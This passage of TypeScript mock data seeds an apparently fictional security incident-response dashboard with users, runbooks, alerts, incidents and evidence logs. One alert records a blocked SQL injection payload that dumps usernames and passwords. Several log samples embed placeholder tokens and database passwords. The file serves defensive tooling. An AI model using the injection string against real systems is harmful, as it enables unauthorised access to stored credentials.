import { 
  Incident, 
  IncidentAlert, 
  EvidenceItem, 
  ResponseTask, 
  TimelineEvent, 
  ApprovedRunbook, 
  DiagnosticRecommendation, 
  ApprovalRequest, 
  AuditLogEntry, 
  User, 
  Integration, 
  SimulationScenario,
  LiveEvent
} from '../types';
import { generateHash } from '../utils/crypto';

export const INITIAL_USERS: User[] = [
  {
    id: 'usr-1',
    name: 'Sarah Connor',
    email: 'sarah.connor@cyberops.corp',
    avatar: 'https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=120&auto=format&fit=crop&q=80',
    role: 'Admin',
    title: 'VP of Information Security',
    department: 'SecOps',
    status: 'Active',
    lastLogin: '2026-09-30T14:12:00Z',
    permissions: [
      'view_alerts', 'manage_incidents', 'view_evidence', 'add_evidence', 
      'manage_tasks', 'view_runbooks', 'request_approval', 'approve_actions', 
      'view_audit_logs', 'manage_users', 'manage_integrations'
    ]
  },
  {
    id: 'usr-2',
    name: 'Marcus Vance',
    email: 'marcus.vance@cyberops.corp',
    avatar: 'https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=120&auto=format&fit=crop&q=80',
    role: 'Incident Commander',
    title: 'Lead Incident Commander',
    department: 'CSIRT',
    status: 'On Call',
    lastLogin: '2026-09-30T14:35:00Z',
    permissions: [
      'view_alerts', 'manage_incidents', 'view_evidence', 'add_evidence', 
      'manage_tasks', 'view_runbooks', 'request_approval', 'approve_actions', 
      'view_audit_logs', 'manage_integrations'
    ]
  },
  {
    id: 'usr-3',
    name: 'Elena Rostova',
    email: 'elena.r@cyberops.corp',
    avatar: 'https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?w=120&auto=format&fit=crop&q=80',
    role: 'Security Analyst',
    title: 'Senior SOC Threat Hunter',
    department: 'SOC Tier 3',
    status: 'Active',
    lastLogin: '2026-09-30T14:50:00Z',
    permissions: [
      'view_alerts', 'manage_incidents', 'view_evidence', 'add_evidence', 
      'manage_tasks', 'view_runbooks', 'request_approval', 'view_audit_logs'
    ]
  },
  {
    id: 'usr-4',
    name: 'David Chen',
    email: 'david.chen@cyberops.corp',
    avatar: 'https://images.unsplash.com/photo-1500648767791-00dcc994a43e?w=120&auto=format&fit=crop&q=80',
    role: 'Responder',
    title: 'Infrastructure & Site Reliability Engineer',
    department: 'SRE / Cloud Ops',
    status: 'Active',
    lastLogin: '2026-09-30T13:40:00Z',
    permissions: [
      'view_alerts', 'view_evidence', 'add_evidence', 
      'manage_tasks', 'view_runbooks', 'request_approval'
    ]
  },
  {
    id: 'usr-5',
    name: 'Rachel Sterling',
    email: 'rachel.s@cyberops.corp',
    avatar: 'https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=120&auto=format&fit=crop&q=80',
    role: 'Auditor',
    title: 'Compliance & Governance Officer',
    department: 'GRC',
    status: 'Active',
    lastLogin: '2026-09-30T11:00:00Z',
    permissions: [
      'view_alerts', 'view_evidence', 'view_runbooks', 'view_audit_logs'
    ]
  },
  {
    id: 'usr-6',
    name: 'Alex Rivera',
    email: 'alex.rivera@cyberops.corp',
    avatar: 'https://images.unsplash.com/photo-1519085360753-af0119f7cbe7?w=120&auto=format&fit=crop&q=80',
    role: 'Viewer',
    title: 'Technical Product Manager',
    department: 'Product',
    status: 'Offline',
    lastLogin: '2026-09-29T18:20:00Z',
    permissions: ['view_alerts']
  }
];

export const INITIAL_APPROVED_RUNBOOKS: ApprovedRunbook[] = [
  {
    id: 'rbk-01',
    name: 'Distributed API Outage & Latency Escalation',
    category: 'API & Infrastructure',
    version: 'v2.4.1',
    approvalStatus: 'Approved',
    lastReviewedDate: '2026-09-15',
    owner: 'Platform SRE Team',
    matchedIncidentTypes: ['API Gateway', 'Ingress Controller', 'Latency Spike'],
    description: 'Standard operational procedure for diagnosing and mitigating severe ingress latency, 5xx storm errors, and DDoS traffic.',
    steps: [
      {
        stepNumber: 1,
        title: 'Inspect Ingress Controller Error Rates',
        instruction: 'Execute telemetry query on Envoy ingress proxy metrics to identify upstream cluster returning 502/504 status codes.',
        safeToAutomate: true,
        requiredPermission: 'view_evidence',
        risk: 'Low'
      },
      {
        stepNumber: 2,
        title: 'Compare Traffic Baseline to Anomaly Window',
        instruction: 'Compare ingress RPS against the previous 14-day 99th percentile rolling average.',
        safeToAutomate: true,
        requiredPermission: 'view_evidence',
        risk: 'Low'
      },
      {
        stepNumber: 3,
        title: 'Engage Edge Rate-Limiting Filter',
        instruction: 'Apply dynamic token bucket rate-limiting at Cloudflare / Edge WAF layer for the affected endpoint path.',
        safeToAutomate: false,
        requiredPermission: 'approve_actions',
        risk: 'Medium'
      },
      {
        stepNumber: 4,
        title: 'Scale Up Downstream Replica Sets',
        instruction: 'Verify pod CPU throttling and scale deployment pods from current replica count.',
        safeToAutomate: false,
        requiredPermission: 'approve_actions',
        risk: 'Medium'
      }
    ]
  },
  {
    id: 'rbk-02',
    name: 'PostgreSQL Database Latency & Connection Pool Exhaustion',
    category: 'Database Tier',
    version: 'v3.1.0',
    approvalStatus: 'Approved',
    lastReviewedDate: '2026-09-20',
    owner: 'Database Administration (DBA)',
    matchedIncidentTypes: ['Database', 'Postgres', 'RDS', 'Connection Pool'],
    description: 'Mitigation procedure when active client connections exceed 90% pool capacity or long-running exclusive locks block queries.',
    steps: [
      {
        stepNumber: 1,
        title: 'Sample Active Long-Running Queries',
        instruction: 'Query pg_stat_activity for backend processes in active status exceeding 30 seconds threshold.',
        safeToAutomate: true,
        requiredPermission: 'view_evidence',
        risk: 'Low'
      },
      {
        stepNumber: 2,
        title: 'Verify PgBouncer / RDS Proxy Connection Saturation',
        instruction: 'Inspect client pool wait duration and queue depth.',
        safeToAutomate: true,
        requiredPermission: 'view_evidence',
        risk: 'Low'
      },
      {
        stepNumber: 3,
        title: 'Terminate Hanging Backend Locks',
        instruction: 'Issue pg_cancel_backend() or pg_terminate_backend() for orphaned queries blocking DDL transactions.',
        safeToAutomate: false,
        requiredPermission: 'approve_actions',
        risk: 'High'
      },
      {
        stepNumber: 4,
        title: 'Rotate Read Replicas & Promote Standby Node',
        instruction: 'Initiate graceful cluster failover to healthy synchronous hot standby.',
        safeToAutomate: false,
        requiredPermission: 'approve_actions',
        risk: 'Critical'
      }
    ]
  },
  {
    id: 'rbk-03',
    name: 'Suspicious Credential Stuffing & Brute-Force Response',
    category: 'Identity & Authentication',
    version: 'v1.9.0',
    approvalStatus: 'Approved',
    lastReviewedDate: '2026-09-28',
    owner: 'Cyber Threat Intelligence (CTI)',
    matchedIncidentTypes: ['Authentication', 'Okta', 'Brute Force', 'Credential Attack'],
    description: 'Approved protocol for containing automated credential replay attacks and distributed botnet authentication attempts.',
    steps: [
      {
        stepNumber: 1,
        title: 'Collect IP Geolocation & ASN Distribution',
        instruction: 'Aggregate failed login sources by ASN, Tor exit node registry, and residential proxy lists.',
        safeToAutomate: true,
        requiredPermission: 'view_evidence',
        risk: 'Low'
      },
      {
        stepNumber: 2,
        title: 'Enforce Step-Up FIDO2 / MFA for Targeted Accounts',
        instruction: 'Transition targeted usernames to mandatory hardware token challenge upon next attempt.',
        safeToAutomate: false,
        requiredPermission: 'approve_actions',
        risk: 'Medium'
      },
      {
        stepNumber: 3,
        title: 'Block Malicious ASN / CIDR Ranges at Edge WAF',
        instruction: 'Deploy automated edge IP block rule for offending /24 subnets exhibiting > 100 failed auth/min.',
        safeToAutomate: false,
        requiredPermission: 'approve_actions',
        risk: 'High'
      }
    ]
  },
  {
    id: 'rbk-04',
    name: 'Ransomware Canary / Unauthorized File Modification',
    category: 'Endpoint & Storage',
    version: 'v2.0.2',
    approvalStatus: 'Approved',
    lastReviewedDate: '2026-08-30',
    owner: 'Host Forensics Team',
    matchedIncidentTypes: ['Ransomware', 'Host Integrity', 'File Integrity'],
    description: 'Immediate containment protocol when canary file traps or rapid encryption heuristics trigger on shared storage volumes.',
    steps: [
      {
        stepNumber: 1,
        title: 'Collect Cryptographic Process Hashes & Memory Dumps',
        instruction: 'Trigger forensic volatile memory capture on suspect workload node before network detachment.',
        safeToAutomate: true,
        requiredPermission: 'view_evidence',
        risk: 'Low'
      },
      {
        stepNumber: 2,
        title: 'Network Quarantine Suspect Node',
        instruction: 'Apply security group isolation allowing only forensic management port 22 through bastion.',
        safeToAutomate: false,
        requiredPermission: 'approve_actions',
        risk: 'Critical'
      },
      {
        stepNumber: 3,
        title: 'Freeze Volume Snapshots & Revoke IAM Session Keys',
        instruction: 'Create immutable AWS EBS snapshot and invalidate active instance profile credentials.',
        safeToAutomate: false,
        requiredPermission: 'approve_actions',
        risk: 'Critical'
      }
    ]
  }
];

export const INITIAL_ALERTS: IncidentAlert[] = [
  {
    id: 'ALT-9041',
    title: 'Repeated HTTP 504 Gateway Timeouts on Core Payment API',
    source: 'Cloudflare WAF & Envoy',
    timestamp: '2026-09-30T14:48:00Z',
    severity: 'Critical',
    status: 'Escalated',
    affectedService: 'payment-gateway-api',
    detectionType: 'Threshold Anomaly (>25% 5xx errors for 3m)',
    assignedResponder: 'Marcus Vance',
    relatedIncidentId: 'INC-2026-0891',
    rawPayload: {
      cluster: 'prod-us-east-1',
      p99_latency_ms: 12450,
      client_error_rate: 0.38,
      auth_header_sample: 'Authorization: Bearer sk_mock_9942a8b27c19f091823abce18293d',
      upstream_node: 'payment-svc-pod-77b8f99d-xk29'
    },
    history: [
      { timestamp: '2026-09-30T14:48:00Z', action: 'Triggered by Envoy telemetry', actor: 'System' },
      { timestamp: '2026-09-30T14:50:00Z', action: 'Escalated to INC-2026-0891', actor: 'Elena Rostova' }
    ]
  },
  {
    id: 'ALT-9042',
    title: 'Distributed Credential Replay Spike Against /v1/auth/login',
    source: 'Okta Verify & AWS WAF',
    timestamp: '2026-09-30T14:32:00Z',
    severity: 'Critical',
    status: 'Escalated',
    affectedService: 'auth-service',
    detectionType: 'Brute Force / Credential Stuffing Pattern',
    assignedResponder: 'Elena Rostova',
    relatedIncidentId: 'INC-2026-0892',
    rawPayload: {
      failed_attempts_count: 8420,
      distinct_ips: 412,
      origin_asn: ['AS16276', 'AS14061'],
      sample_payload: 'user=admin&password=Password123!&api_secret=sk_mock_auth_9812739182470129'
    },
    history: [
      { timestamp: '2026-09-30T14:32:00Z', action: 'High velocity alert raised', actor: 'Okta SIEM' },
      { timestamp: '2026-09-30T14:34:00Z', action: 'Correlated with active botnet signatures', actor: 'Elena Rostova' }
    ]
  },
  {
    id: 'ALT-9043',
    title: 'PostgreSQL Primary Node Connection Pool Exhaustion (98%)',
    source: 'Datadog Database Monitoring',
    timestamp: '2026-09-30T14:20:00Z',
    severity: 'High',
    status: 'Escalated',
    affectedService: 'postgresql-primary-cluster',
    detectionType: 'Resource Saturation',
    assignedResponder: 'David Chen',
    relatedIncidentId: 'INC-2026-0893',
    rawPayload: {
      active_connections: 982,
      max_connections: 1000,
      waiting_clients: 145,
      db_uri: 'postgresql://db_app_user:db_pass=SuperSecret9912!@postgres-prod.internal:5432/core_db'
    },
    history: [
      { timestamp: '2026-09-30T14:20:00Z', action: 'Alert triggered', actor: 'Datadog APM' }
    ]
  },
  {
    id: 'ALT-9044',
    title: 'Unauthorized IAM Role Policy Modification Detected',
    source: 'AWS CloudTrail & GuardDuty',
    timestamp: '2026-09-30T13:50:00Z',
    severity: 'High',
    status: 'Escalated',
    affectedService: 'aws-iam-identity',
    detectionType: 'Privilege Escalation Event',
    assignedResponder: 'Marcus Vance',
    relatedIncidentId: 'INC-2026-0894',
    rawPayload: {
      event_name: 'AttachRolePolicy',
      role_arn: 'arn:aws:iam::112233445566:role/ProdDataPipelineRole',
      caller_identity: 'AKIAIOSFODNN7EXAMPLE',
      source_ip: '198.51.100.44'
    },
    history: [
      { timestamp: '2026-09-30T13:50:00Z', action: 'CloudTrail Event Dispatched', actor: 'GuardDuty' }
    ]
  },
  {
    id: 'ALT-9045',
    title: 'Anomalous Outbound SSH Traffic to Known C2 IP Range',
    source: 'Suricata NIDS / CrowdStrike',
    timestamp: '2026-09-30T13:15:00Z',
    severity: 'Critical',
    status: 'Escalated',
    affectedService: 'k8s-worker-node-04',
    detectionType: 'C2 Beaconing Pattern',
    assignedResponder: 'Elena Rostova',
    relatedIncidentId: 'INC-2026-0895',
    rawPayload: {
      dest_ip: '185.220.101.5',
      dest_port: 2222,
      packet_count: 1480,
      process_name: '/tmp/.hidden_kswapd',
      hash: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855'
    },
    history: [
      { timestamp: '2026-09-30T13:15:00Z', action: 'Suricata signature fired', actor: 'NIDS' }
    ]
  },
  {
    id: 'ALT-9046',
    title: 'Kubernetes Pod Memory Limit Breached & OOMKilled',
    source: 'Prometheus / AlertManager',
    timestamp: '2026-09-30T14:40:00Z',
    severity: 'Medium',
    status: 'Triaged',
    affectedService: 'analytics-worker-consumer',
    detectionType: 'Container Lifecycle Event',
    assignedResponder: 'David Chen',
    rawPayload: {
      namespace: 'production',
      container: 'worker-engine',
      restart_count: 4,
      oom_timestamp: '2026-09-30T14:39:58Z'
    },
    history: [
      { timestamp: '2026-09-30T14:40:00Z', action: 'Pod restart recorded', actor: 'AlertManager' }
    ]
  },
  {
    id: 'ALT-9047',
    title: 'Spike in Geo-IP Impossible Travel for Support Lead',
    source: 'Okta Identity Cloud',
    timestamp: '2026-09-30T12:05:00Z',
    severity: 'Medium',
    status: 'Triaged',
    affectedService: 'okta-sso-gateway',
    detectionType: 'Impossible Travel Velocity',
    assignedResponder: 'Elena Rostova',
    rawPayload: {
      account: 'donna.noble@cyberops.corp',
      origin_1: 'London, UK (12:00:10)',
      origin_2: 'Lagos, Nigeria (12:05:22)',
      client_agent: 'Python-requests/2.28.1'
    },
    history: [
      { timestamp: '2026-09-30T12:05:00Z', action: 'MFA prompt challenged', actor: 'Okta' }
    ]
  },
  {
    id: 'ALT-9048',
    title: 'TLS Certificate Expiration Approaching (< 7 Days)',
    source: 'CertManager Operator',
    timestamp: '2026-09-30T10:00:00Z',
    severity: 'Low',
    status: 'New',
    affectedService: 'internal-vault-cluster',
    detectionType: 'Certificate Lifecycle Warning',
    assignedResponder: 'David Chen',
    rawPayload: {
      domain: 'vault.internal.cyberops.corp',
      expiry_date: '2026-10-06T23:59:59Z',
      issuer: 'Internal Corporate CA'
    },
    history: [
      { timestamp: '2026-09-30T10:00:00Z', action: 'Certificate renewal scheduled', actor: 'CertManager' }
    ]
  },
  {
    id: 'ALT-9049',
    title: 'High Ingress WAF Rule Matches for SQL Injection Payload',
    source: 'Cloudflare WAF',
    timestamp: '2026-09-30T14:52:00Z',
    severity: 'High',
    status: 'Escalated',
    affectedService: 'customer-portal-api',
    detectionType: 'OWASP SQLi Rule 942100 Triggered',
    assignedResponder: 'Marcus Vance',
    relatedIncidentId: 'INC-2026-0891',
    rawPayload: {
      matched_expression: "1' UNION SELECT username, password FROM users --",
      source_ip: '45.154.255.89',
      action_taken: 'Blocked by Edge WAF'
    },
    history: [
      { timestamp: '2026-09-30T14:52:00Z', action: 'Payload intercepted by edge firewall', actor: 'Cloudflare' }
    ]
  },
  {
    id: 'ALT-9050',
    title: 'S3 Bucket Public Access Block Setting Disabled',
    source: 'AWS Config & Macie',
    timestamp: '2026-09-30T11:45:00Z',
    severity: 'Medium',
    status: 'Suppressed',
    affectedService: 'aws-storage-s3',
    detectionType: 'Configuration Drift Alert',
    assignedResponder: 'Sarah Connor',
    rawPayload: {
      bucket_name: 'cyberops-public-marketing-assets',
      state: 'PublicReadAllowed',
      reason: 'Authorized public media release bucket'
    },
    history: [
      { timestamp: '2026-09-30T11:45:00Z', action: 'Suppression approved per policy tag', actor: 'Sarah Connor' }
    ]
  }
];

export const INITIAL_INCIDENTS: Incident[] = [
  {
    id: 'INC-2026-0891',
    title: 'Critical Gateway Latency & 504 Storm on Payment API',
    description: 'High error rate (>35% 504 Gateway Timeout) on the primary payment processing gateway causing customer transaction drops.',
    severity: 'Critical',
    status: 'Investigating',
    incidentCommander: 'Marcus Vance',
    assignedResponder: 'David Chen',
    createdTime: '2026-09-30T14:48:00Z',
    updatedTime: '2026-09-30T15:05:00Z',
    affectedService: 'payment-gateway-api',
    affectedSystems: ['payment-gw-prod-01', 'payment-gw-prod-02', 'stripe-bridge-service', 'k8s-ingress-prod'],
    tags: ['Payment', 'Latency', '5xx-Errors', 'Critical-Path'],
    mttaMinutes: 2,
    relatedAlertIds: ['ALT-9041', 'ALT-9049'],
    aiSummary: {
      summary: 'Payment API gateway experiencing severe degradation with 38% HTTP 504 gateway timeout responses across US-East-1.',
      whatHappened: 'At 14:48 UTC, Envoy ingress proxy reported a rapid surge in upstream connection queue saturation, correlating with uncharacteristic slow payloads.',
      startedAt: '2026-09-30T14:48:00Z',
      affectedSystems: ['payment-gateway-api', 'k8s-ingress-prod', 'stripe-bridge-service'],
      currentImpact: 'Direct impact on checkout workflows. Approximately 420 customer transactions failed over the last 15 minutes.',
      knownIndicators: [
        'p99 latency escalated from 120ms to 12,450ms',
        'Ingress connection pool exhaustion in pod cluster payment-svc',
        'Simultaneous SQLi scan activity detected from ASN 14061'
      ],
      responseStatus: 'Incident commander Marcus Vance coordinating mitigation. Diagnostic thread dump requested.',
      recommendedNextSteps: [
        'Check database connection pool metrics for payment-gateway backend',
        'Inspect upstream envoy proxy error distribution',
        'Evaluate activating circuit breaker fallback to secondary processor'
      ],
      generatedAt: '2026-09-30T15:02:00Z'
    }
  },
  {
    id: 'INC-2026-0892',
    title: 'High-Volume Distributed Credential Stuffing Campaign',
    description: 'Over 8,000 automated authentication attempts per minute targeting corporate SSO and external customer API tokens.',
    severity: 'Critical',
    status: 'Mitigating',
    incidentCommander: 'Marcus Vance',
    assignedResponder: 'Elena Rostova',
    createdTime: '2026-09-30T14:32:00Z',
    updatedTime: '2026-09-30T15:10:00Z',
    affectedService: 'auth-service',
    affectedSystems: ['okta-sso-gateway', 'auth0-proxy', 'customer-identity-vault'],
    tags: ['Brute-Force', 'Identity', 'Botnet', 'WAF'],
    mttaMinutes: 2,
    relatedAlertIds: ['ALT-9042'],
    aiSummary: {
      summary: 'Coordinated credential stuffing attack detected across 412 distinct proxy IPs targeting authentication endpoints.',
      whatHappened: 'A botnet began rotating leaked username/password combos against /v1/auth/login with high concurrency.',
      startedAt: '2026-09-30T14:32:00Z',
      affectedSystems: ['auth-service', 'okta-sso-gateway'],
      currentImpact: 'No confirmed account takeovers detected yet. 18 accounts temporarily locked due to failed attempt thresholds.',
      knownIndicators: [
        'Spike in failed authentication requests (8,420 attempts)',
        'Botnet user-agents masquerading as legacy mobile apps',
        'Requests distributed over 18 residential ASNs'
      ],
      responseStatus: 'Rate limiting implemented at edge WAF. Step-up MFA challenge pending Commander approval.',
      recommendedNextSteps: [
        'Inspect top 20 attacking ASN blocks for edge CIDR null-route',
        'Verify compromised credential list against HaveIBeenPwned API',
        'Issue mandatory password reset for 18 locked accounts'
      ],
      generatedAt: '2026-09-30T14:45:00Z'
    }
  },
  {
    id: 'INC-2026-0893',
    title: 'PostgreSQL Primary Connection Exhaustion & Lock Contention',
    description: 'Primary transactional database reached 98% connection limit with multiple blocked queries on the orders table.',
    severity: 'High',
    status: 'Investigating',
    incidentCommander: 'Marcus Vance',
    assignedResponder: 'David Chen',
    createdTime: '2026-09-30T14:20:00Z',
    updatedTime: '2026-09-30T14:55:00Z',
    affectedService: 'postgresql-primary-cluster',
    affectedSystems: ['pg-primary-01', 'pg-replica-01', 'pgbouncer-pool-01'],
    tags: ['Database', 'Postgres', 'PgBouncer', 'Locks'],
    mttaMinutes: 4,
    relatedAlertIds: ['ALT-9043'],
    aiSummary: {
      summary: 'PostgreSQL connection starvation triggered by an unindexed reporting query holding an exclusive row lock on orders_v2.',
      whatHappened: 'Analytics batch job spawned unthrottled worker threads at 14:18 UTC, filling PgBouncer client pool.',
      startedAt: '2026-09-30T14:20:00Z',
      affectedSystems: ['postgresql-primary-cluster', 'pgbouncer-pool-01'],
      currentImpact: 'Query wait times elevated to 14.2s. Web application experiencing intermittent 500 error cascades.',
      knownIndicators: [
        '982 / 1000 connections occupied',
        'PID 4491 holding ExclusiveLock on orders_v2 for 1,480s',
        'PgBouncer queue latency > 8000ms'
      ],
      responseStatus: 'DBA team examining query plan. Diagnostic query termination awaiting approval.',
      recommendedNextSteps: [
        'Execute safe pg_cancel_backend on PID 4491 after approval',
        'Verify query pool depth on PgBouncer',
        'Isolate analytics queries to read-only replica pg-replica-01'
      ],
      generatedAt: '2026-09-30T14:35:00Z'
    }
  },
  {
    id: 'INC-2026-0894',
    title: 'Unauthorized IAM Privilege Escalation on Production Role',
    description: 'Security policy breach: AdministratorAccess policy attached to non-privileged data pipeline instance profile.',
    severity: 'High',
    status: 'Investigating',
    incidentCommander: 'Sarah Connor',
    assignedResponder: 'Elena Rostova',
    createdTime: '2026-09-30T13:50:00Z',
    updatedTime: '2026-09-30T14:30:00Z',
    affectedService: 'aws-iam-identity',
    affectedSystems: ['ProdDataPipelineRole', 'data-pipeline-k8s-pod', 'aws-iam'],
    tags: ['IAM', 'Privilege-Escalation', 'CloudTrail', 'AWS'],
    mttaMinutes: 3,
    relatedAlertIds: ['ALT-9044'],
    aiSummary: {
      summary: 'CloudTrail captured an unauthorized AttachRolePolicy call giving full AdministratorAccess to an internal EC2 instance profile.',
      whatHappened: 'An automated deployment script with elevated STS tokens ran outside scheduled CI/CD change windows.',
      startedAt: '2026-09-30T13:50:00Z',
      affectedSystems: ['aws-iam-identity', 'ProdDataPipelineRole'],
      currentImpact: 'Potential over-privileged credential exposure. No anomalous API calls made using the role so far.',
      knownIndicators: [
        'Call initiated from source IP 198.51.100.44',
        'Target policy: arn:aws:iam::aws:policy/AdministratorAccess',
        'Event ID: evt-cloudtrail-991204'
      ],
      responseStatus: 'Role permissions detached; analyst reviewing CloudTrail session replay.',
      recommendedNextSteps: [
        'Audit all API calls made by ProdDataPipelineRole in the last 60 minutes',
        'Revoke temporary STS session tokens for the instance profile',
        'Lock IAM policy modification behind CI/CD GitOps workflow only'
      ],
      generatedAt: '2026-09-30T14:15:00Z'
    }
  },
  {
    id: 'INC-2026-0895',
    title: 'Anomalous Outbound C2 Beaconing on Worker Node k8s-04',
    description: 'Threat detection signature triggered on outbound SSH traffic to known adversary command and control IP address.',
    severity: 'Critical',
    status: 'Mitigating',
    incidentCommander: 'Marcus Vance',
    assignedResponder: 'Elena Rostova',
    createdTime: '2026-09-30T13:15:00Z',
    updatedTime: '2026-09-30T14:40:00Z',
    affectedService: 'k8s-worker-node-04',
    affectedSystems: ['k8s-worker-node-04', 'containerd-runtime', 'vpc-prod-subnet-b'],
    tags: ['C2', 'CrowdStrike', 'Malware', 'Containment'],
    mttaMinutes: 1,
    relatedAlertIds: ['ALT-9045'],
    aiSummary: {
      summary: 'Host k8s-worker-node-04 established unauthorized encrypted tunnel to malicious C2 infrastructure (185.220.101.5).',
      whatHappened: 'A vulnerable base image container was exploited via known remote code execution vulnerability (CVE-2024-38063).',
      startedAt: '2026-09-30T13:15:00Z',
      affectedSystems: ['k8s-worker-node-04'],
      currentImpact: 'Node isolated at VPC security group level. Workloads cordoned and drained to adjacent nodes.',
      knownIndicators: [
        'Binary execution from /tmp/.hidden_kswapd',
        'Repeated TCP connect on port 2222',
        'Match with CrowdStrike Falcon adversary adversary group FANCY_BEAR'
      ],
      responseStatus: 'Forensic volatile memory captured. Awaiting Commander authorization for full instance termination.',
      recommendedNextSteps: [
        'Inspect surrounding nodes in subnet for lateral movement indicators',
        'Validate cryptographic hashes of all container images deployed today',
        'Submit memory dump to sandbox analysis pipeline'
      ],
      generatedAt: '2026-09-30T13:30:00Z'
    }
  },
  {
    id: 'INC-2026-0888',
    title: 'Customer Onboarding Microservice Memory Leak & Latency Degradation',
    description: 'Progressive memory leak causing GC pauses over 1500ms and eventual pod crash loops in eu-central-1 region.',
    severity: 'Medium',
    status: 'Resolved',
    incidentCommander: 'Marcus Vance',
    assignedResponder: 'David Chen',
    createdTime: '2026-09-30T09:10:00Z',
    updatedTime: '2026-09-30T11:45:00Z',
    resolvedTime: '2026-09-30T11:45:00Z',
    affectedService: 'onboarding-microservice',
    affectedSystems: ['onboarding-api-eu-01', 'onboarding-api-eu-02'],
    tags: ['Memory-Leak', 'OOM', 'Performance', 'Resolved'],
    mttaMinutes: 5,
    mttrMinutes: 155,
    relatedAlertIds: ['ALT-9046'],
    aiSummary: {
      summary: 'Unbounded heap allocation in customer PDF generation module caused memory exhaustion and repeated pod evictions.',
      whatHappened: 'V2.1.4 release included unclosed file handles in headless chromium worker pool.',
      startedAt: '2026-09-30T09:10:00Z',
      affectedSystems: ['onboarding-microservice'],
      currentImpact: 'Resolved. Hotfix patch v2.1.5 deployed and verified stable for 2 hours.',
      knownIndicators: ['Linear heap climb to 4GB cgroup limit', 'GC STW pause duration > 1.8s'],
      responseStatus: 'Closed after validation in staging & production.',
      recommendedNextSteps: ['Introduce automated memory leak regression testing into CI pipeline.'],
      generatedAt: '2026-09-30T11:50:00Z'
    }
  },
  {
    id: 'INC-2026-0885',
    title: 'DNS Resolution Intermittent Failures on Internal CoreDNS',
    description: 'Internal microservices intermittently failing to resolve service meshes and database endpoints.',
    severity: 'Low',
    status: 'Closed',
    incidentCommander: 'Sarah Connor',
    assignedResponder: 'David Chen',
    createdTime: '2026-09-29T16:00:00Z',
    updatedTime: '2026-09-29T17:30:00Z',
    resolvedTime: '2026-09-29T17:30:00Z',
    affectedService: 'coredns-infrastructure',
    affectedSystems: ['coredns-k8s-01', 'coredns-k8s-02'],
    tags: ['DNS', 'Networking', 'CoreDNS', 'Closed'],
    mttaMinutes: 8,
    mttrMinutes: 90,
    relatedAlertIds: [],
    aiSummary: {
      summary: 'Upstream AWS VPC DNS rate throttling caused temporary NXDOMAIN returns during deployment peak.',
      whatHappened: 'High frequency DNS lookups without local caching daemon.',
      startedAt: '2026-09-29T16:00:00Z',
      affectedSystems: ['coredns-infrastructure'],
      currentImpact: 'Resolved by enabling NodeLocal DNSCache daemonset across worker fleet.',
      knownIndicators: ['UDP 53 timeout rate > 4%'],
      responseStatus: 'Closed. No recurring anomalies.',
      recommendedNextSteps: ['Document DNS caching best practices for new containerized services.'],
      generatedAt: '2026-09-29T17:35:00Z'
    }
  }
];

export const INITIAL_EVIDENCE: EvidenceItem[] = [
  {
    id: 'EVD-101',
    incidentId: 'INC-2026-0891',
    title: 'Envoy Ingress Proxy Access Log Excerpt with Secrets',
    type: 'log_snippet',
    description: 'High-volume HTTP 504 error response slice captured from ingress controller pod during latency peak.',
    content: `[2026-09-30T14:48:12.110Z] "POST /v1/checkout/charge HTTP/1.1" 504 - 12452 0 "client_ip=45.154.255.89"
Authorization: Bearer sk_mock_9942a8b27c19f091823abce18293d
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
X-Forwarded-For: 45.154.255.89
upstream_connect_status: TIMED_OUT [target: 10.244.3.44:8080]
db_connection_ref: postgresql://db_user:password=SecretPassWord123!@10.244.1.20:5432/payments
X-Trace-ID: trc-991204-ae89`,
    source: 'k8s-ingress-prod-envoy-7c89b7-pl90',
    collectedBy: 'Elena Rostova',
    collectionTimestamp: '2026-09-30T14:52:00Z',
    hash: generateHash('EVD-101-envoy-ingress-log'),
    hashVerified: true,
    chainOfCustody: [
      { timestamp: '2026-09-30T14:52:00Z', action: 'Captured from FluentBit log stream', user: 'Elena Rostova', details: 'Stream verified and cryptographically signed' },
      { timestamp: '2026-09-30T14:55:00Z', action: 'Submitted to Incident Evidence Vault', user: 'Elena Rostova', details: 'SHA-256 integrity hash calculated' }
    ],
    redacted: true,
    fileSize: '4.2 KB'
  },
  {
    id: 'EVD-102',
    incidentId: 'INC-2026-0891',
    title: 'TCP Connection Pool Diagnostic Output',
    type: 'diagnostic_output',
    description: 'Netstat and TCP socket state dump indicating socket starvation on payment gateway backend.',
    content: `Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0  44120 10.244.3.44:8080        10.244.1.20:5432        ESTABLISHED 1489/java
tcp        0      0 10.244.3.44:8080        45.154.255.89:49812     TIME_WAIT   -
tcp      340      0 10.244.3.44:8080        45.154.255.89:49813     SYN_RECV    -
tcp      420      0 10.244.3.44:8080        45.154.255.89:49814     SYN_RECV    -
Total TCP Sockets: 8420 [ESTABLISHED: 1040, SYN_RECV: 3890, TIME_WAIT: 3490]
System Socket Limit: 4096 (EXCEEDED)`,
    source: 'payment-gw-prod-01 [10.244.3.44]',
    collectedBy: 'David Chen',
    collectionTimestamp: '2026-09-30T14:56:00Z',
    hash: generateHash('EVD-102-socket-diagnostic'),
    hashVerified: true,
    chainOfCustody: [
      { timestamp: '2026-09-30T14:56:00Z', action: 'Diagnostic telemetry collected via SSH agent', user: 'David Chen', details: 'Read-only diagnostic command output' }
    ],
    redacted: false,
    fileSize: '1.8 KB'
  },
  {
    id: 'EVD-103',
    incidentId: 'INC-2026-0892',
    title: 'Okta Auth Audit Logs with Compromised Token Request',
    type: 'event_record',
    description: 'Security event record documenting rapid credential brute force attempts with exposed API credentials.',
    content: `{"eventType":"user.authentication.auth_via_mfa","outcome":"FAILURE","reason":"INVALID_CREDENTIALS",
"actor":{"id":"usr-unknown","alternateId":"admin@cyberops.corp"},
"client":{"ipAddress":"185.220.101.44","geographicalContext":{"country":"Unknown","city":"Tor Exit"}},
"debugContext":{"debugData":{"auth_header":"Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
"client_secret":"sk_mock_auth_9812739182470129","retry_count":842}}}`,
